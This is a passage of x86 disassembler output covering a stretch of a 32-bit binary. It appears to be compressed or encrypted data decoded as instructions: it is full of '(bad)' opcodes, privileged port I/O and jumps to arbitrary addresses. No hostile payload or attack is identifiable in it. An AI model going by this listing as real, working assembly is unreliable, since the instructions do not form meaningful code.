  40a2c1:	or     DWORD PTR [eax-0x707979a2],esp
  40a2c7:	fisub  DWORD PTR [ebp-0x7a776d2d]
  40a2cd:	sbb    BYTE PTR [edi],dl
  40a2cf:	pushf  
  40a2d0:	ror    DWORD PTR [esi-0x647548a2],0x28
  40a2d7:	cmp    al,0xed
  40a2d9:	cmc    
  40a2da:	lahf   
  40a2db:	cmp    BYTE PTR [edi+0xe],0x7f
  40a2df:	push   es
  40a2e0:	xchg   esp,eax
  40a2e1:	jb     0x40a2e2
  40a2e3:	sbb    BYTE PTR [edi+0x27],ah
  40a2e6:	loopne 0x40a31f
  40a2e8:	xchg   ecx,eax
  40a2e9:	or     DWORD PTR [ebp-0x3e480cc5],0x2e
  40a2f0:	cmp    DWORD PTR [ebx-0x62],ebx
  40a2f3:	sub    al,0xa0
  40a2f5:	mov    esp,0x555dd36b
  40a2fa:	adc    BYTE PTR [ebx+0x6d38c17a],cl
  40a300:	scas   al,BYTE PTR es:[edi]
  40a301:	call   0x785bab0e
  40a306:	pop    esi
  40a307:	in     al,0x5f
  40a309:	push   esi
  40a30a:	mov    dl,0xf1
  40a30c:	out    0x44,al
  40a30e:	nop
  40a30f:	inc    eax
  40a310:	test   eax,0x86455fb3
  40a315:	add    al,0x85
  40a317:	or     BYTE PTR [ebx-0x36],bh
  40a31a:	aaa    
  40a31b:	fs adc eax,0x6fabd74e
  40a321:	ja     0x40a2db
  40a323:	mov    al,ds:0xc8138e57
  40a328:	js     0x40a341
  40a32a:	stos   BYTE PTR es:[edi],al
  40a32b:	js     0x40a365
  40a32d:	xor    DWORD PTR [ebx-0x49],ebp
  40a330:	pop    ecx
  40a331:	test   al,0xbf
  40a333:	test   DWORD PTR [esi+0x7fff8b83],edi
  40a339:	test   BYTE PTR [edx-0x19],cl
  40a33c:	loopne 0x40a2e3
  40a33e:	leave  
  40a33f:	ja     0x40a2df
  40a341:	scas   eax,DWORD PTR es:[edi]
  40a342:	add    DWORD PTR [edi],ebx
  40a344:	rcl    DWORD PTR [ecx+0x72a2d877],0xad
  40a34b:	push   ss
  40a34c:	mov    edx,0x432fdc4f
  40a351:	data16 je 0x40a344
  40a354:	sub    BYTE PTR [edx+0xb8e8ab2],0x13
  40a35b:	(bad)  
  40a35c:	mov    ebx,0xdcca4dbb
  40a361:	adc    ah,BYTE PTR [edi+0x78]
  40a364:	adc    ebp,0xffffffd1
  40a367:	ffreep st(3)
  40a369:	in     eax,dx
  40a36a:	dec    esi
  40a36b:	pop    esp
  40a36c:	sti    
  40a36d:	cld    
  40a36e:	bound  edi,QWORD PTR [esi]
  40a370:	or     ebx,esi
  40a372:	cld    
  40a373:	mov    edx,0x3fde2f50
  40a378:	fmul   DWORD PTR [ebp+0x32]
  40a37b:	push   eax
  40a37c:	xchg   DWORD PTR [edx-0x1f593f6b],esp
  40a382:	or     DWORD PTR ds:[edi],ebp
  40a385:	test   ebp,ebx
  40a387:	or     ebx,DWORD PTR [ebx+0xdcf9d00]
  40a38d:	add    DWORD PTR [edi-0x730d7afb],ebx
  40a393:	mov    esi,0x8f60f78d
  40a398:	jb     0x40a38f
  40a39a:	jg     0x40a34b
  40a39c:	xchg   ecx,esp
  40a39e:	pop    ds
  40a39f:	xchg   edi,eax
  40a3a0:	cwde   
  40a3a1:	out    dx,al
  40a3a2:	fimul  WORD PTR [edi-0x62]
  40a3a5:	jp     0x40a3e4
  40a3a7:	popf   
  40a3a8:	cmp    dl,BYTE PTR [esi-0xc]
  40a3ab:	pushf  
  40a3ac:	fucomp st(4)
  40a3ae:	mov    edi,0x154148e1
  40a3b3:	(bad)  
  40a3b5:	add    eax,0xd55f5334
  40a3ba:	cs cmp ecx,eax
  40a3bd:	call   0xf9bf:0xa0aa4290
  40a3c4:	in     al,0xea
  40a3c6:	mov    esi,0x45bbc4f9
  40a3cb:	popf   
  40a3cc:	repz cwde 
  40a3ce:	mov    bh,ah
  40a3d0:	outs   dx,DWORD PTR ds:[esi]
  40a3d1:	mov    BYTE PTR [ecx+0x7f],bl
  40a3d4:	leave  
  40a3d5:	jbe    0x40a36a
  40a3d7:	call   0xf458:0x1a5d838f
  40a3de:	xchg   edi,eax
  40a3df:	data16 cld 
  40a3e1:	xor    al,0x4
  40a3e3:	adc    dh,dh
  40a3e5:	cwde   
  40a3e6:	jb     0x40a3c2
  40a3e8:	outs   dx,BYTE PTR ds:[esi]
  40a3e9:	bound  esp,QWORD PTR ds:0xd67e0bbe
  40a3ef:	jmp    0x82bd8f8
  40a3f4:	fisubr DWORD PTR [ebx-0x41]
  40a3f7:	stos   DWORD PTR es:[edi],eax
  40a3f8:	rcr    BYTE PTR [ebx-0x6df44797],0x63
  40a3ff:	sbb    eax,0x14c99bf0
  40a404:	push   ecx
  40a405:	icebp  
  40a406:	(bad)  
  40a408:	xadd   BYTE PTR [ebx+0x5e],dl
  40a40c:	lods   al,BYTE PTR ds:[esi]
  40a40d:	push   eax
  40a40e:	or     DWORD PTR [ecx+eiz*2+0x1c],esp
  40a412:	stc    
  40a413:	(bad)  
  40a414:	loop   0x40a415
  40a416:	dec    esp
  40a417:	test   al,0x3
  40a419:	imul   ecx,DWORD PTR [edi],0xffffffc2
  40a41c:	pop    ss
  40a41d:	lods   eax,DWORD PTR ds:[esi]
  40a41e:	icebp  
  40a41f:	xor    DWORD PTR [edi-0x43],ecx
  40a422:	inc    esp
  40a423:	fdiv   DWORD PTR [eax-0x3ce6d142]
  40a429:	pop    edx
  40a42a:	sub    BYTE PTR [esi+ecx*2],0xfb
  40a42e:	popf   
  40a42f:	(bad)  
  40a430:	lock cli 
  40a432:	add    esp,ebx
  40a434:	lea    ebx,[ebx+0x1acaf779]
  40a43a:	std    
  40a43b:	mov    esi,0x849d02f8
  40a440:	xor    al,0x49
  40a442:	addr16 out dx,eax
  40a444:	add    eax,0xc780994e
  40a449:	push   eax
  40a44a:	xchg   DWORD PTR [ebp+eiz*8-0xf],ebx
  40a44e:	in     eax,0x2b
  40a450:	add    ebx,DWORD PTR [esi+0x291450c7]
  40a456:	sbb    eax,0xa6f48501
  40a45b:	fist   DWORD PTR [edi-0xd]
  40a45e:	out    0x13,al
  40a460:	aad    0xda
  40a462:	aaa    
  40a463:	dec    ebp
  40a464:	je     0x40a4a3
  40a466:	add    DWORD PTR [ebx+0x3021e999],esp
  40a46c:	mov    ds:0xa1337337,al
  40a471:	gs and eax,0x677491c2
  40a477:	jl     0x40a4bc
  40a479:	sub    BYTE PTR [eax-0x488c8549],ah
  40a47f:	mov    bh,0x55
  40a481:	out    0xdc,eax
  40a483:	leave  
  40a484:	xchg   ecx,eax
  40a485:	sub    al,0x89
  40a487:	retf   0xf86
  40a48a:	out    0x61,eax
  40a48c:	fbld   TBYTE PTR [edi]
  40a48e:	sbb    al,0x73
  40a490:	push   ss
  40a491:	cmc    
  40a492:	sbb    DWORD PTR [ebp-0x4f],esi
  40a495:	ins    BYTE PTR es:[edi],dx
  40a496:	mov    esp,0x1ffc413
  40a49b:	cmp    dl,dh
  40a49d:	iret   
  40a49e:	(bad)  
  40a49f:	repz mov ?,esi
  40a4a2:	push   edx
  40a4a3:	popf   
  40a4a4:	call   0xf46dfb5
  40a4a9:	or     al,0x3f
  40a4ab:	out    0x8b,al
  40a4ad:	inc    edi
  40a4ae:	frstor [ecx-0x59]
  40a4b1:	inc    edi
  40a4b2:	xor    DWORD PTR [ecx],esi
  40a4b4:	or     bl,BYTE PTR [eax]
  40a4b6:	jg     0x40a516
  40a4b8:	jb     0x40a519
  40a4ba:	push   ds
  40a4bb:	je     0x40a4f0
  40a4bd:	rcl    DWORD PTR [ecx-0x7b6fafd7],0xfc
  40a4c4:	ins    DWORD PTR es:[edi],dx
  40a4c5:	retf   
  40a4c6:	repnz xchg edi,eax
  40a4c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c9:	adc    ecx,DWORD PTR ds:0xa9796b0b
  40a4cf:	mov    esp,0x6b3171af
  40a4d4:	jo     0x40a47a
  40a4d6:	outs   dx,BYTE PTR ds:[esi]
  40a4d7:	ins    BYTE PTR es:[edi],dx
  40a4d8:	out    dx,al
  40a4d9:	clc    
  40a4da:	arpl   WORD PTR [edx+ebx*1],sp
  40a4dd:	inc    esi
  40a4de:	fs (bad) 
  40a4e0:	or     al,0xef
  40a4e2:	sub    DWORD PTR [esi+0x749a2c10],0x2034eb5a
  40a4ec:	push   ds
  40a4ed:	pop    edi
  40a4ee:	int3   
  40a4ef:	or     eax,0x9e8561de
  40a4f4:	inc    esi
  40a4f5:	sti    
  40a4f6:	jb     0x40a517
  40a4f8:	xchg   edi,edi
  40a4fa:	imul   esi,DWORD PTR [edi+0x6a],0xffffffe0
  40a4fe:	(bad)  
  40a4ff:	rol    BYTE PTR [ecx-0x2d6ad061],1
  40a505:	inc    edi
  40a506:	adc    esp,DWORD PTR [eax+0x76f8bad]
  40a50c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a50d:	sbb    BYTE PTR [ebp-0x4941dd47],0x87
  40a514:	inc    ebx
  40a515:	pop    esi
  40a516:	pusha  
  40a517:	shr    edx,0xde
  40a51a:	call   0xf3465cad
  40a51f:	(bad)  
  40a520:	pop    ebp
  40a521:	inc    ebp
  40a522:	imul   ecx,DWORD PTR [ebp+0x66ff1519],0x149f2308
  40a52c:	shr    BYTE PTR ds:0xa83fac1d,1
  40a532:	jg     0x40a4bd
  40a534:	loopne 0x40a4d3
  40a536:	jbe    0x40a50c
  40a538:	lods   eax,DWORD PTR ds:[esi]
  40a539:	jbe    0x40a4cb
  40a53b:	lods   eax,DWORD PTR ds:[esi]
  40a53c:	mov    al,ds:0x85ab39c2
  40a541:	add    bh,ch
  40a543:	(bad)  
  40a544:	add    eax,0xa937d47b
  40a549:	mov    esi,0x5dfe6dfd
  40a54e:	mov    cl,0x70
  40a550:	sbb    eax,0x72b98aab
  40a555:	inc    esi
  40a556:	je     0x40a510
  40a558:	dec    eax
  40a559:	cmp    al,0x3d
  40a55b:	call   0xdb5335af
  40a560:	(bad)  
  40a562:	ret    0x9da2
  40a565:	fdiv   QWORD PTR [ebx-0x3e]
  40a568:	std    
  40a569:	ss xor al,0xed
  40a56c:	out    0xf0,al
  40a56e:	lock inc BYTE PTR [edx+0x3b2ab48c]
  40a575:	mov    ch,0xc9
  40a577:	rcl    ch,0x16
  40a57a:	outs   dx,DWORD PTR ds:[esi]
  40a57b:	cs push 0xc4c5c203
  40a581:	dec    edx
  40a583:	out    0x64,al
  40a585:	test   al,0xae
  40a587:	fist   WORD PTR [ecx]
  40a589:	cdq    
  40a58a:	push   ss
  40a58b:	aam    0xed
  40a58d:	scas   eax,DWORD PTR es:[edi]
  40a58e:	jmp    FWORD PTR [ebx]
  40a590:	push   edi
  40a591:	mov    cl,0x8
  40a593:	dec    edi
  40a594:	xchg   esp,eax
  40a595:	mov    ecx,0xf7f0a7bc
  40a59a:	ins    DWORD PTR es:[edi],dx
  40a59b:	ficomp DWORD PTR [eax+eiz*8+0x1c]
  40a59f:	dec    ecx
  40a5a0:	popf   
  40a5a1:	jno    0x40a550
  40a5a3:	mov    ah,0x19
  40a5a5:	xchg   edx,eax
  40a5a6:	mov    eax,ds:0x414513b2
  40a5ab:	adc    cl,BYTE PTR [esp+ebx*1-0x42]
  40a5af:	scas   eax,DWORD PTR es:[edi]
  40a5b0:	cld    
  40a5b1:	test   eax,0x19444c7
  40a5b6:	sub    dl,ch
  40a5b8:	pop    esp
  40a5b9:	lods   eax,DWORD PTR ds:[esi]
  40a5ba:	fucomip st,st(5)
  40a5bc:	adc    edx,DWORD PTR [ecx+0x69]
  40a5bf:	dec    edx
  40a5c0:	nop
  40a5c1:	into   
  40a5c2:	cmp    eax,0xf0056ee5
  40a5c7:	iret   
  40a5c8:	sbb    eax,0x5d847576
  40a5cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5ce:	lea    ebx,[edx-0x3ee25a62]
  40a5d4:	push   ds
  40a5d5:	inc    esi
  40a5d6:	dec    esi
  40a5d7:	stos   DWORD PTR es:[edi],eax
  40a5d8:	xor    eax,0x82543f8c
  40a5dd:	outs   dx,DWORD PTR ds:[esi]
  40a5de:	jne    0x40a560
  40a5e0:	pop    es
  40a5e1:	sbb    BYTE PTR [edi],bh
  40a5e3:	repz cli 
  40a5e5:	cmp    eax,DWORD PTR [eax]
  40a5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5e8:	addr16 mov ds:0xf44f,al
  40a5ec:	mov    bl,0xd1
  40a5ee:	retf   0xff3b
  40a5f1:	in     eax,dx
  40a5f2:	xor    DWORD PTR [ebp-0x75],0x13
  40a5f6:	jno    0x40a61e
  40a5f8:	mov    ebx,0x6e80b096
  40a5fd:	call   0xf6dfc627
  40a602:	fdivp  st(1),st
  40a604:	xchg   esi,eax
  40a605:	mov    eax,ds:0xd66b0b76
  40a60a:	shl    DWORD PTR [ebx],cl
  40a60c:	je     0x40a60f
  40a60e:	maskmovq mm4,mm3
  40a611:	xchg   BYTE PTR [esi-0x2ef3db60],cl
  40a617:	pop    edi
  40a618:	cmp    DWORD PTR [edi],eax
  40a61a:	inc    esi
  40a61b:	mov    cl,0x88
  40a61d:	jge    0x40a665
  40a61f:	push   cs
  40a620:	pushf  
  40a621:	add    eax,0x11256260
  40a626:	mov    al,0xe5
  40a628:	push   eax
  40a629:	imul   edi,DWORD PTR [ebp+0x3],0x20
  40a62d:	xchg   ebp,eax
  40a62e:	dec    ebx
  40a62f:	shl    DWORD PTR [esi+0x6e3bfba],1
  40a635:	int    0x62
  40a637:	pop    esp
  40a638:	fwait
  40a639:	rcl    DWORD PTR [ecx-0x70],0x96
  40a63d:	popa   
  40a63e:	shr    BYTE PTR [esi-0x54],cl
  40a641:	addr16 xor cl,bl
  40a644:	cmp    al,BYTE PTR [eax-0x30]
  40a647:	ret    
  40a648:	and    BYTE PTR [ecx],ch
  40a64a:	jecxz  0x40a5d9
  40a64c:	jge    0x40a6b5
  40a64e:	outs   dx,BYTE PTR ds:[esi]
  40a64f:	loop   0x40a606
  40a651:	fst    QWORD PTR [edi+edi*2]
  40a654:	push   ebp
  40a655:	adc    al,0x8c
  40a657:	xchg   ecx,eax
  40a658:	imul   edi,DWORD PTR [eax-0x3278c849],0x2c996abc
  40a662:	test   DWORD PTR ds:0x2c010ab2,ecx
  40a668:	mov    esi,DWORD PTR [esi-0x28]
  40a66b:	sbb    bh,cl
  40a66d:	inc    esi
  40a66e:	ss icebp 
  40a670:	cmp    esi,DWORD PTR [edi-0x57]
  40a673:	and    al,0xc1
  40a675:	fsub   QWORD PTR [eax]
  40a677:	push   ds
  40a678:	sbb    eax,0x74469ad4
  40a67d:	cmp    ebx,DWORD PTR [edx+0x2f]
  40a680:	jne    0x40a662
  40a682:	xor    al,0x1e
  40a684:	scas   eax,DWORD PTR es:[edi]
  40a685:	mov    esi,0x9196ed0b
  40a68a:	gs dec esi
  40a68c:	out    dx,eax
  40a68d:	mov    edx,0x2d494793
  40a692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a693:	cmp    al,0x38
  40a695:	and    esi,esp
  40a697:	ret    
  40a698:	inc    edx
  40a699:	(bad)  
  40a69a:	dec    ebp
  40a69b:	dec    edx
  40a69c:	nop
  40a69d:	test   BYTE PTR [ebx],0xd3
  40a6a0:	iret   
  40a6a1:	mov    DWORD PTR [esi-0x3f91ae78],eax
  40a6a7:	sbb    dh,BYTE PTR [edi]
  40a6a9:	add    al,0xf2
  40a6ab:	je     0x40a68f
  40a6ad:	pop    edx
  40a6ae:	ret    0x302
  40a6b1:	jns    0x40a67a
  40a6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6b4:	rol    DWORD PTR [ebp-0x1b622e61],cl
  40a6ba:	arpl   WORD PTR [edx],ax
  40a6bc:	or     eax,0x8488a8fc
  40a6c1:	clc    
  40a6c2:	push   es
  40a6c3:	fisub  WORD PTR [ebx]
  40a6c5:	xor    ebx,DWORD PTR [edx-0x35]
  40a6c8:	out    dx,eax
  40a6c9:	scas   eax,DWORD PTR es:[edi]
  40a6ca:	test   eax,0xf079042
  40a6cf:	jle    0x40a6e3
  40a6d1:	push   edx
  40a6d2:	ror    BYTE PTR [eax-0x49476442],0x78
  40a6d9:	fld    DWORD PTR [eax+edx*1]
  40a6dc:	fild   QWORD PTR [esi+0x796c480f]
  40a6e2:	gs mov bh,0x12
  40a6e5:	hlt    
  40a6e6:	sahf   
  40a6e7:	jbe    0x40a6df
  40a6e9:	dec    DWORD PTR [edx+0x32]
  40a6ec:	push   0x318ac1b1
  40a6f1:	fs cdq 
  40a6f3:	sbb    DWORD PTR [ecx+0x43e7b949],ebp
  40a6f9:	sbb    eax,0xeb22ef43
  40a6fe:	in     al,0x73
  40a700:	test   BYTE PTR [edx],0x62
  40a703:	std    
  40a704:	adc    ah,BYTE PTR [ebx]
  40a706:	add    dh,BYTE PTR [edi]
  40a708:	sbb    al,0x95
  40a70a:	shr    DWORD PTR [eax-0x50],0x9b
  40a70e:	pushf  
  40a70f:	xor    cl,BYTE PTR [esi+0x49cd1d5f]
  40a715:	cmp    edx,esp
  40a717:	push   eax
  40a718:	push   eax
  40a719:	sbb    ah,ch
  40a71b:	fstp   DWORD PTR [ebp+0x5925b11a]
  40a721:	cwde   
  40a722:	push   eax
  40a723:	xchg   ebx,eax
  40a724:	xor    dh,0x99
  40a727:	shr    DWORD PTR [eax],0xd3
  40a72a:	xchg   edi,eax
  40a72b:	aad    0x4
  40a72d:	xchg   ebx,eax
  40a72e:	dec    ebp
  40a72f:	jmp    0xf2315a35
  40a734:	les    edi,FWORD PTR [esi]
  40a736:	xor    edi,DWORD PTR [ebx-0x6c]
  40a739:	pop    esp
  40a73a:	mov    eax,ds:0x33969e93
  40a73f:	std    
  40a740:	fs nop
  40a742:	jecxz  0x40a786
  40a744:	adc    dl,bh
  40a746:	outs   dx,DWORD PTR ds:[esi]
  40a747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a748:	call   0xf1b235c0
  40a74d:	sbb    DWORD PTR [eax-0x26],ebx
  40a750:	mov    esp,0xa23dddc1
  40a755:	int    0xf5
  40a757:	outs   dx,DWORD PTR ds:[esi]
  40a758:	add    DWORD PTR [esp+ebp*2-0x2b39bda8],0xffffffb8
  40a760:	loopne 0x40a774
  40a762:	(bad)  
  40a763:	dec    eax
  40a764:	sbb    ch,BYTE PTR [edi-0x3d]
  40a767:	mov    ecx,0xbebd564d
  40a76c:	ins    BYTE PTR es:[edi],dx
  40a76d:	mov    ds:0xb18dbe7d,eax
  40a772:	pop    es
  40a773:	xchg   ebx,eax
  40a774:	ja     0x40a7b3
  40a776:	add    eax,0xf0a57832
  40a77b:	xchg   esi,edx
  40a77d:	retf   0xa4a1
  40a780:	aaa    
  40a781:	gs pop edi
  40a783:	jnp    0x40a7ad
  40a785:	out    dx,al
  40a786:	test   DWORD PTR [ebp+0x35],esi
  40a789:	add    edi,DWORD PTR [esp+ebx*4+0x7]
  40a78d:	adc    eax,DWORD PTR [esi+edi*2-0x1c]
  40a791:	fnsave ds:[edx+0x3ebb1cd0]
  40a798:	add    eax,eax
  40a79a:	xor    al,0x77
  40a79c:	test   BYTE PTR [ecx-0x491af513],dl
  40a7a2:	test   eax,0x192d5f21
  40a7a7:	mov    ds:0x3323e037,eax
  40a7ac:	enter  0xa486,0x76
  40a7b0:	imul   ecx,DWORD PTR [edi],0x3d76af5b
  40a7b6:	and    al,0x67
  40a7b8:	out    0x95,al
  40a7ba:	cmc    
  40a7bb:	or     DWORD PTR [edx],edi
  40a7bd:	test   BYTE PTR [ecx],0x7b
  40a7c0:	or     al,BYTE PTR [edi-0x13d341c]
  40a7c6:	popa   
  40a7c7:	fldpi  
  40a7c9:	pusha  
  40a7ca:	in     eax,0x15
  40a7cc:	xchg   esi,eax
  40a7cd:	mov    ebx,0xfd8bc7c1
  40a7d2:	xor    al,0xe7
  40a7d4:	shr    ah,cl
  40a7d6:	push   0xffffffbf
  40a7d8:	adc    DWORD PTR [ebx],ebp
  40a7da:	jbe    0x40a842
  40a7dc:	mov    ebp,0xbc56d94e
  40a7e1:	shl    ebp,cl
  40a7e3:	mov    edi,0xc14a6b10
  40a7e8:	shr    DWORD PTR [ebp-0x5bcc3875],cl
  40a7ee:	rol    DWORD PTR [esi],cl
  40a7f0:	retf   
  40a7f1:	xchg   ebp,eax
  40a7f2:	pop    eax
  40a7f3:	pusha  
  40a7f4:	dec    eax
  40a7f5:	pop    es
  40a7f6:	clc    
  40a7f7:	inc    esi
  40a7f8:	jg     0x40a7bf
  40a7fa:	or     BYTE PTR [esi],cl
  40a7fc:	mov    ah,0xe1
  40a7fe:	pop    ecx
  40a7ff:	add    BYTE PTR ds:0x575d9e62,dh
  40a805:	(bad)  
  40a806:	jle    0x40a7d8
  40a808:	xchg   al,cl
  40a80a:	jnp    0x40a78d
  40a80c:	sti    
  40a80d:	call   0x454d923f
  40a812:	mov    cl,0xc3
  40a814:	pusha  
  40a815:	xchg   edi,eax
  40a816:	sti    
  40a817:	push   0x52
  40a819:	xchg   esi,eax
  40a81a:	je     0x40a867
  40a81c:	mov    esi,0x8ec54b41
  40a821:	or     al,0xe0
  40a823:	fcmovnu st,st(7)
  40a825:	lahf   
  40a826:	in     eax,dx
  40a827:	mov    ebx,DWORD PTR [ecx]
  40a829:	jmp    0x5723:0x150b1821
  40a830:	sbb    BYTE PTR [eax+ebp*4-0x74c960f0],ch
  40a837:	call   0x892e8510
  40a83c:	mov    BYTE PTR [ecx+0x69b075a6],cl
  40a842:	in     al,dx
  40a843:	aam    0x81
  40a845:	pop    esp
  40a846:	xchg   edi,eax
  40a847:	push   ecx
  40a848:	push   ebp
  40a849:	pop    esi
  40a84a:	mov    ah,0xd5
  40a84c:	repz or cl,dl
  40a84f:	imul   ebp,DWORD PTR [esi],0x8dca08d1
  40a855:	xchg   ecx,eax
  40a856:	cs xor al,0xa6
  40a859:	pop    ds
  40a85a:	call   0xf710:0x38b0ca64
  40a861:	std    
  40a862:	shl    ah,1
  40a864:	jne    0x40a824
  40a866:	inc    edx
  40a867:	leave  
  40a868:	sbb    BYTE PTR [ebp-0x6],al
  40a86b:	rcr    BYTE PTR [ebp+0x395b7108],1
  40a871:	fidivr WORD PTR [edx-0x43]
  40a874:	jmp    0x40a8ed
  40a876:	mov    al,0xd2
  40a878:	imul   edi,DWORD PTR [ebp+0x1f28f60d],0x61
  40a87f:	test   al,0x1d
  40a881:	ror    BYTE PTR [eax-0xd],1
  40a884:	popf   
  40a885:	cs ins DWORD PTR es:[edi],dx
  40a887:	xchg   esp,eax
  40a888:	idiv   DWORD PTR [ecx]
  40a88a:	ret    
  40a88b:	pushf  
  40a88c:	test   al,0x90
  40a88e:	mov    dh,0x9e
  40a890:	rcr    DWORD PTR [ecx-0x4f1dac26],cl
  40a896:	in     eax,dx
  40a897:	sbb    eax,0x42677079
  40a89c:	and    esi,esp
  40a89e:	mov    cl,0x1f
  40a8a0:	bound  edi,QWORD PTR [edi-0x24]
  40a8a3:	sub    esp,DWORD PTR [edx-0x52]
  40a8a6:	repz xor esi,DWORD PTR cs:[eax-0xd5d5ff2]
  40a8ae:	rcr    BYTE PTR [ecx+0x5ac4db04],cl
  40a8b4:	or     ch,0x42
  40a8b7:	ret    0x8173
  40a8ba:	cmp    cl,0xfd
  40a8bd:	or     bh,bh
  40a8bf:	xor    al,0x6e
  40a8c1:	jne    0x40a8e6
  40a8c3:	bound  ebx,QWORD PTR [ebp+0x5c]
  40a8c6:	mov    edx,0x281d21c4
  40a8cb:	scas   eax,DWORD PTR es:[edi]
  40a8cc:	leave  
  40a8cd:	test   BYTE PTR [esi-0x6e271291],ah
  40a8d3:	or     bl,al
  40a8d5:	imul   BYTE PTR [edx+0x5bfc22a8]
  40a8db:	pop    DWORD PTR [edx+0x69]
  40a8de:	sub    BYTE PTR [esi],bh
  40a8e0:	arpl   dx,bx
  40a8e2:	scas   al,BYTE PTR es:[edi]
  40a8e3:	and    cl,al
  40a8e5:	pop    ebp
  40a8e6:	aad    0x6a
  40a8e8:	xlat   BYTE PTR ds:[ebx]
  40a8e9:	das    
  40a8ea:	bound  ebx,QWORD PTR [edi+0x5c]
  40a8ed:	outs   dx,DWORD PTR ds:[esi]
  40a8ee:	add    DWORD PTR [esi+0x609561a],0xbe35302d
  40a8f8:	sub    edx,0x613443c9
  40a8fe:	test   DWORD PTR [eax-0xf],esi
  40a901:	mov    bl,0x6a
  40a903:	adc    al,0xb5
  40a905:	enter  0xac96,0xd
  40a909:	xor    BYTE PTR [eax+0x553812b8],al
  40a90f:	std    
  40a910:	aas    
  40a911:	mov    ebx,0x7718de40
  40a916:	dec    ebx
  40a917:	test   BYTE PTR [ebx],dh
  40a919:	jb     0x40a8d4
  40a91b:	imul   eax,ecx,0xffffff94
  40a91e:	or     esi,ebp
  40a920:	cmp    edx,eax
  40a922:	in     eax,dx
  40a923:	cwde   
  40a924:	imul   esp,esi,0xcc103e43
  40a92a:	aas    
  40a92b:	nop
  40a92c:	call   0xcd330d68
  40a931:	rol    edx,1
  40a933:	out    dx,al
  40a934:	sar    BYTE PTR [ebx+0x70],0x42
  40a938:	mov    eax,0x6f466a0
  40a93d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a93e:	mov    edi,0xd97cbedd
  40a943:	in     eax,0xc7
  40a945:	sbb    ch,bl
  40a947:	push   esp
  40a948:	mov    ebx,0xab7f8e1c
  40a94d:	add    al,BYTE PTR [eax-0x48]
  40a950:	fsubr  DWORD PTR [ecx+edx*1+0x539f39b4]
  40a957:	iret   
  40a958:	pop    ebx
  40a959:	sub    edx,edx
  40a95b:	ja     0x40a8e6
  40a95d:	add    ah,bh
  40a95f:	clc    
  40a960:	lods   al,BYTE PTR ds:[esi]
  40a961:	sar    WORD PTR ss:[ebx+0x2e75c40],1
  40a969:	popa   
  40a96a:	dec    esi
  40a96b:	push   0x2b
  40a96d:	or     ch,BYTE PTR [eax+ebp*2+0x78f18c9b]
  40a974:	data16 jnp 0x40a939
  40a977:	xor    dl,BYTE PTR [esi]
  40a979:	push   esi
  40a97a:	jp     0x40a953
  40a97c:	cdq    
  40a97d:	int3   
  40a97e:	cmp    al,0x70
  40a980:	xchg   ebp,eax
  40a981:	xchg   ebp,eax
  40a982:	sbb    al,0x8e
  40a984:	dec    eax
  40a985:	jge    0x40a97b
  40a987:	sar    ecx,0x3d
  40a98a:	loope  0x40a9b9
  40a98c:	mov    ch,0x54
  40a98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a98f:	fwait
  40a990:	jle    0x40aa06
  40a992:	aad    0x59
  40a994:	cmp    al,0xda
  40a996:	ret    0x2b0f
  40a999:	inc    edx
  40a99a:	cli    
  40a99b:	mov    edx,0xd5e9b660
  40a9a0:	icebp  
  40a9a1:	sbb    eax,0x56f42cf
  40a9a6:	push   ebx
  40a9a7:	mov    esp,0x2cbeaecf
  40a9ac:	pop    ss
  40a9ad:	bound  edi,QWORD PTR [eax+0x7e]
  40a9b0:	fs scas eax,DWORD PTR es:[edi]
  40a9b2:	dec    ecx
  40a9b3:	repz or eax,0xb1afc4ea
  40a9b9:	shl    DWORD PTR [ecx-0x4c07a50e],0x27
  40a9c0:	xor    ecx,DWORD PTR [ebp-0x568db26a]
  40a9c6:	into   
  40a9c7:	call   esi
  40a9c9:	ror    BYTE PTR [edi-0x1aa359df],0x14
  40a9d0:	push   es
  40a9d1:	mov    ds:0x2566a898,al
  40a9d6:	add    al,0x45
  40a9d8:	lods   al,BYTE PTR ds:[esi]
  40a9d9:	xchg   BYTE PTR [ebx-0x27],al
  40a9dc:	test   al,0x54
  40a9de:	adc    esp,DWORD PTR [eax]
  40a9e0:	test   eax,0xf2944c90
  40a9e5:	cmp    ch,BYTE PTR [eax]
  40a9e7:	mov    ecx,0x8eb0a910
  40a9ec:	rcr    BYTE PTR [esi],cl
  40a9ee:	iret   
  40a9ef:	fild   WORD PTR [ecx+0x4862cb6e]
  40a9f5:	push   esp
  40a9f6:	and    eax,0xc87cc672
  40a9fb:	icebp  
  40a9fc:	(bad)  
  40a9fd:	fiadd  WORD PTR [edi]
  40a9ff:	dec    edi
  40aa00:	jle    0x40a9d5
  40aa02:	xchg   DWORD PTR [eax-0x69680995],esp
  40aa08:	ds mov edx,0x44b297a4
  40aa0e:	jo     0x40aa34
  40aa10:	fdiv   DWORD PTR [esp]
  40aa13:	test   DWORD PTR [ecx+ebx*8+0x31292456],edi
  40aa1a:	js     0x40aa73
  40aa1c:	add    DWORD PTR [eax-0x6c],esi
  40aa1f:	outs   dx,BYTE PTR ds:[esi]
  40aa20:	cwde   
  40aa21:	ss (bad) 
  40aa23:	outs   dx,BYTE PTR ds:[esi]
  40aa24:	test   al,0xcc
  40aa26:	imul   ebp,DWORD PTR [eax],0x52c9dc43
  40aa2c:	push   esp
  40aa2d:	in     eax,0x18
  40aa2f:	loope  0x40a9ff
  40aa31:	cpuid  
  40aa33:	push   edx
  40aa34:	and    al,0x9e
  40aa36:	xor    DWORD PTR [edi+0x67ca6dfc],ebp
  40aa3c:	call   0x3f09b98d
  40aa41:	adc    cl,BYTE PTR [edi+0x8a22f2a]
  40aa47:	jns    0x40aabe
  40aa49:	fmul   st(7),st
  40aa4b:	mov    ch,0x6c
  40aa4d:	in     al,0xec
  40aa4f:	sub    al,0x10
  40aa51:	sbb    al,0xd5
  40aa53:	icebp  
  40aa54:	mov    WORD PTR [edi],es
  40aa56:	jmp    0x350d72a9
  40aa5b:	call   0x9ef5:0x15d39848
  40aa62:	test   al,0xdb
  40aa64:	push   esi
